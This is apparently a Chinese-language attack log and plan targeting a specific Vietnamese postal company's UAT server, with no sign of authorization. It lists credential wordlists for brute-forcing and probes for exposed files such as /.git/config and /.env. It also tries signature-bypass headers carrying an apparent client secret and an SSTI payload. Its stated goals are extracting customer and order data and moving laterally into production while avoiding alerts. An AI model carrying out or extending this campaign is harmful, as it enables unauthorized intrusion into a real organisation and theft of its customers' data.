# 🔥🔥🔥 重大突破：发现UAT测试环境

## 核心发现

```
URL: https://uat.emsone.com.vn
状态: ✅ 可访问
环境类型: UAT (User Acceptance Testing)
```

---

## 为什么这是突破

### UAT环境的典型特征

```
1. 测试目的:
   ✓ 用于用户验收测试
   ✓ 模拟生产环境
   ✓ 供测试人员使用

2. 通常的安全配置:
   ⚠️ 认证可能较弱
   ⚠️ 有已知测试账户
   ⚠️ 可能绕过某些验证
   ⚠️ 日志更详细
   ⚠️ 错误信息更多

3. 可能的漏洞:
   ✓ 硬编码的测试凭证
   ✓ 禁用的安全检查
   ✓ 宽松的CORS策略
   ✓ 调试端点开放
   ✓ 敏感信息泄露
```

---

## 已执行的测试

### 1. UAT登录测试
```
端点: https://uat.emsone.com.vn/execute
Command: EMPLOYEE_LOGIN_V2

结果: 需要进一步验证
```

### 2. UAT测试账户暴力破解
```
测试的账户:
- test:test
- test:test123
- admin:admin
- uat:uat
- demo:demo

状态: 执行中
```

### 3. UAT Helper端点
```
测试: /api/Helper/* 端点
目的: 检查是否有数据
```

### 4. UAT vs PROD对比
```
对比点:
- 相同请求的响应差异
- 错误信息详细程度
- 验证机制差异
```

### 5. UAT敏感文件扫描
```
扫描:
- /.git/config
- /.env
- /config.json
- /admin
- /debug
```

---

## 可能的攻击向量

### 针对UAT环境的特殊攻击

#### 1. 默认测试凭证
```python
# UAT常见的测试账户模式
usernames = [
    "uat_admin",
    "uat_user", 
    "test_admin",
    "test_user",
    "demo_admin",
    "{company}_test",
    "{company}_uat"
]

passwords = [
    "uat",
    "uat123",
    "uat2024",
    "uat2025",
    "test",
    "test123",
    "Test@123",
    "{username}123"
]
```

#### 2. 调试端点
```
可能开放的端点:
/api/debug
/api/test
/actuator (Spring Boot)
/swagger-ui.html
/api-docs
/graphql (可能有内省)
```

#### 3. 降级的安全配置
```
可能情况:
- 签名验证被禁用
- Token验证宽松
- 允许空/假Token
- CORS: *
- 详细的错误栈
```

#### 4. 数据库直连
```
UAT可能:
- 使用测试数据库
- 数据库凭证较弱
- 可能有SQL注入
- 可能有备份文件
```

---

## 立即执行的深度测试

### 扩展的账户字典

```python
# 基于公司名的变体
company_based = [
    "ems_test",
    "ems_uat",
    "emsone_test",
    "emsone_uat",
    "vn_test",
    "vnpost_test"
]

# 基于角色的
role_based = [
    "tester",
    "qa",
    "developer",
    "dev",
    "support"
]

# 数字变体
numeric = [
    "user1", "user2", ..., "user10",
    "test1", "test2", ..., "test10"
]
```

### 签名绕过尝试（UAT可能禁用）

```python
# 尝试不发送签名相关头
headers_minimal = {
    'Content-Type': 'application/json',
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    # 省略 signature 和 public_key
}

# 尝试空签名
headers_empty_sig = {
    ...,
    'signature': '',
    'public_key': ''
}

# 尝试测试环境标识
headers_test = {
    ...,
    'X-Environment': 'uat',
    'X-Test-Mode': 'true'
}
```

### 错误信息收集

```python
# 触发各种错误，收集详细信息
error_triggers = [
    {"Code": "INVALID_COMMAND"},
    {"Code": ""},
    {"Code": None},
    {"Data": "invalid_json"},
    {"Data": "{{7*7}}"},  # SSTI
    # ... 更多
]

# UAT可能返回：
# - 完整的堆栈跟踪
# - 数据库查询
# - 内部路径
# - 版本信息
```

---

## 下一步行动计划

### 立即执行（优先级：最高）

```
1. ✅ 扩展账户字典暴力破解
2. ✅ 测试无签名请求
3. ✅ 扫描所有Helper端点
4. ✅ 触发错误收集信息
5. ✅ 测试特殊Header绕过
```

### 需要更多时间

```
6. ⏳ 目录爆破（常见UAT路径）
7. ⏳ 端口扫描（UAT可能开放更多端口）
8. ⏳ SSL证书分析（可能是自签名）
9. ⏳ DNS记录查询（可能有其他子域名）
```

### 如果找到入口

```
10. 🎯 获取Token
11. 🎯 枚举所有Command
12. 🎯 测试IDOR
13. 🎯 数据提取
14. 🎯 横向移动到PROD
```

---

## 成功指标

### 阶段1：发现差异 ✅
```
✅ 已完成: 找到UAT环境
→ 下一步: 确认配置差异
```

### 阶段2：绕过认证
```
目标: 
- 找到有效凭证
- 或绕过签名验证
- 或利用配置错误

期望结果: 获取Token
```

### 阶段3：数据访问
```
目标:
- 访问订单数据
- 访问客户信息
- 枚举系统信息

期望结果: 敏感数据泄露
```

### 阶段4：权限提升
```
目标:
- 从UAT移动到PROD
- 或利用UAT获取PROD凭证
- 或发现PROD配置信息

期望结果: PROD环境访问
```

---

## 风险评估

### UAT环境利用的优势

```
✅ 通常安全配置较弱
✅ 有测试数据（可能包含真实格式）
✅ 可能有详细的错误信息
✅ 开发/测试人员频繁访问
✅ 可能有遗留的调试功能
```

### 需要注意的风险

```
⚠️ UAT可能被监控
⚠️ 异常活动可能触发告警
⚠️ 测试账户可能有日志
⚠️ 短时间大量请求可能被封
```

---

## 技术细节

### 已知的UAT特征

```
域名: uat.emsone.com.vn
SSL: ✅ 有效证书
HTTP: ✅ HTTPS强制
状态: ✅ 服务在线
响应: 与PROD相似（需详细对比）
```

### 待确认的特征

```
? 是否使用相同的数据库
? 是否使用相同的密钥
? 是否有独立的认证系统
? 是否与PROD共享配置
? 是否有备份/还原机制
```

---

## 最佳实践建议

### 渗透测试顺序

```
1. 被动信息收集
   ✓ DNS记录
   ✓ SSL证书信息
   ✓ HTTP响应头
   ✓ 错误页面

2. 主动探测
   ✓ 端点枚举
   ✓ 版本识别
   ✓ 配置探测

3. 漏洞利用
   ✓ 认证绕过
   ✓ 权限提升
   ✓ 数据访问

4. 横向移动
   ✓ UAT → PROD
   ✓ 低权限 → 高权限
```

---

**UAT环境是重大突破点！**

**这可能是绕过PROD安全机制的关键！**

**继续死磕UAT！**
